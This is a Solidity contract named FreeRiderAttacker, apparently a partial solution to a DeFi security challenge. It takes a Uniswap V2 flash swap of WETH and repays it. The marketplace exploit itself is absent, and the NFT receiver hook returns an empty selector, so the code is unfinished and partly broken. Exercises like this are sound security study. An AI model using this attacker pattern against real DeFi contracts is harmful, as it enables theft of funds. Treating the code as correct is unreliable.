// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "hardhat/console.sol";

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint amount) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract FreeRiderAttacker is IERC721Receiver, IUniswapV2Callee {
    IUniswapV2Pair immutable pair;
    IWETH immutable weth;
    IERC721 immutable token;

    constructor(IUniswapV2Pair _pair, IWETH _weth, IERC721 _nftToken) {
        pair = _pair;
        weth = _weth;
        token = _nftToken;
    }

    function flashSwap(uint amount) external {
        bytes memory data = abi.encode(weth, amount);
        pair.swap(amount, 0, address(this), data);

        console.log("flashSwap successufll");
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        require(msg.sender == address(pair), "Not Pair");

        (address decodedAddress, uint amountDecoded) = abi.decode(
            data,
            (address, uint)
        );
        require(decodedAddress == address(weth), "v2call not weth");
        uint paybackAmount = (amount0 * 1000) / 997 + 1;
        uint wethBalance = weth.balanceOf(address(this));

        bool sent = weth.transfer(address(pair), paybackAmount);
        require(sent, "weth not payed back");

        //amount0 is weth
        //amount1 is token and its value should be == 0
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {}

    receive() external payable {}
}
